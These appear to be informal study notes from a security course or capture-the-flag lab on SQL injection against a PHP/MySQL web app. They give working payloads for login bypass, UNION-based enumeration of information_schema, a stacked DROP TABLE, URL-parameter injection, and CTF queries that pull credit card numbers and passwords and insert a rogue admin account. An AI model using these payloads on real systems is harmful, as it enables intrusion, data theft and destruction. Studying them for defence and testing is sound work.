SQL - Structured Query Language - ANSI Standard                                         UNION AND SELECT COMMANDS WE WILL FOCUS ON.
SELECT- Extracts data from a database
UNION -Used to combine the result-set of two or more SELECT statements
USE -Selects the DB to use
UPDATE- Updates data in a database
DELETE -Deletes data from a database
INSERT INTO -Inserts new data into a database
CREATE DATABASE -Creates a new database
ALTER DATABASE -Modifies a database
CREATE TABLE -Creates a new table
ALTER TABLE -Modifies a table
DROP TABLE -Deletes a table
CREATE INDEX -Creates an index (search key)
DROP INDEX -Deletes an index

authentication bypass 
input this in user and password column 'OR 1='1  and click login this is a (POST REQUEST)
payload of the post request in the developer console and click on the network tab and login to see the post request. 
in the developer console click request to cature that payload of that data and then hit the toggle to turn on "raw" url padden version of that payload copy and paste (THIS IS A GET REQUEST) and put a ? mark before url and click ENTER



standard sql injection 



sQL INJECTION CONSIDERATION
-Requires Valid SQL Queries
-Fully patched systems can be vulnerable due to misconfiguration
-Input Field Sanitization
-String vs Integer Values #will add the $ or that bullet 
-information_schema
-GET Request versus POST Request HTTP methods


UNSANITIZED FIELD
  input fields can be found using a Single Quote ⇒ '
    Will return extraneous information
    ' closes a variable, to allow for additional statements/clauses
    May show no errors or generic error (harder Injection)

SANITIZED
  input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)


SERVER-SIDE QUERY PROCESSING 
  The Server-Side Query that would be passed to MySQL from PHP would be:
  BEFORE INPUT: SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
  AFTER INPUT:  SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;


EXAMPLE -INJECTING YOUR STATEMENT
  User enters tom' OR 1='1 in the name and pass fields.
    ##Truth Statement: tom ' OR 1='1
      Server-Side query executed would appear like this: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’


STACKING STATEMENTS
  Chaining multiple statements together using a semi-colon ;
  SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; -- '


  

DEMO WALK THROUGH 
mysql -drop you in the sql server

##GOLDEN STATEMENT
product=7 select table_schema, table_name, column_name from information_schema.columns #
   <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> FROM <NAME OF DATABASE>.<NAME OF TABLE>
, names of column 
name of the database (.)name of the table 

database
  table
    column

information_schema ##name of database                custom database aka "session" == flags 
  columns          ##name of table
    table-schema    ## name of columns
    table_name       ## name of columns
    column_name      ## name of columns


COMMANDS FOR DATABASE
  >use infomation_schema
  >show tables ;
  >show columns from columns
  >select table_schema, table_name, column_name from information_schema.columns

##default database
information_schema
performance_schema
mysql
information schema you will need to query 

## QUERY
select tireid,name,size from session.tires ;    #case sensitive 

standard sql injection                          Example
1. IDENTIFY VULNERABLE FIELD/SELECTION      fORD' OR 1='1  #VULNERABILITY ALWAYS GIVE MORE INFORMATION
2. IDENTIFY # OF COLUMNS/SELECTIONS         Audi' UNion SELECT 1,2,3,4 #                   #####HASHTAG A PART OF THE SYNTAX########
3. MODIFY GOLDEN STATEMENT                  Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #  
4. CRAFT QUERIES                            Audi' UNION SELECT tireid,2,name,size,cost from session.tires #  
                                            Audi' UNION SELECT tireid,name,size,cost from session.tires #

GET METHOD 
1. IDENTIFY VULNERABLE FIELD/SELECTION      SELECTION=1 OR 1=1
2. identify number of columns                SELECTION=1 UNION SELECT 1,2,3
3 MODIFY THE GOLDEN RULE                      SELECTION=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
4 CRAFT QUERY                                  SELECTION=2 UNION SELECT start,status,last_access from session.session_log
                                                SELECTION=2 UNION SELECT id,name,pass from session.user

Nesting statements
## Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
  UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

ignore the rest
  Using # or -- tells the Database to ignore everything after
  Input to Inject: 1 or 1=1; #   #-part of the syntax


Blind injection for validation:
  php?item=4 OR 1=1
  Try ALL combinations! item=1, item=2, item=3, etc.

Abuse The Client (GET METHOD)
Passing injection through the URL:
After the .php?item=4 pass your UNION statement
prices.php?item=4 UNION SELECT 1,2
prices.php?item=4 UNION SELECT 1,2,@@version

Abuse The Client (Enum)
  php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()



ctf 
http://127.0.0.1:10090/cases/productsCategory.php?category=13%20UNION%20SELECT%20table_schema,%20table_name,%20column_name%20from%20information_schema.columns
Boss	R1x9TEeAJsxYwZsIUB3x
Products=1 UNION SELECT 1,2,@@VERSION

127.0.0.1:10090/cases/productsCategory.php?category=1 UNION SELECT id,creditcard_number, from sqlinjection.payments
union select creditcard_number,date,order from sqlinjection.payments

NSERT INTO members (first_name, last_name, username, password, email, permission)
VALUES ('Hacker', 'Hacker', ''OR 1='1', '''OR 1=''1', 'Hacker@gmail.com', 3) 


1 or 1=1; # 








